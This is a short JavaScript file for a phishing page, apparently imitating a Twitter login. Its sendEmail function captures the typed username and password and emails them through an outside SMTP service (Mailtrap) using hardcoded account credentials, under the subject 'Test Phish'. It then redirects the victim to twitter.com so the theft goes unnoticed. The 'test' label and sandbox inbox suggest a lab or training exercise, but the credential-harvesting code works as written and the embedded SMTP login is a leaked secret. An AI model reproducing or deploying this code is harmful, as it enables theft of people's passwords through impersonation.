$("#login-button").click(function(event){
    event.preventDefault();

$('form').fadeOut(500);
$('.wrapper').addClass('form-success');
});

function sendEmail() {
let user = document.getElementById("user").value;
let password = document.getElementById("password").value;
Email.send({
   Host : "smtp.mailtrap.io",
   Username : "16aa66ac7dda77",
   Password : "2823cdcd4831d5",
   To : 'ea34f39bd2-9b380f@inbox.mailtrap.io',
   From : "ea34f39bd2-9b380f@inbox.mailtrap.io",
   Subject : "Test Phish",
   Body : "<html><h2>Usuario</h2><h3>"+user+"</h3><br></br><h2>Contraseña</h2><h3>"+password+"</h3></html>"
}).then(
 () => window.location.href = "https://twitter.com/home" 
);
}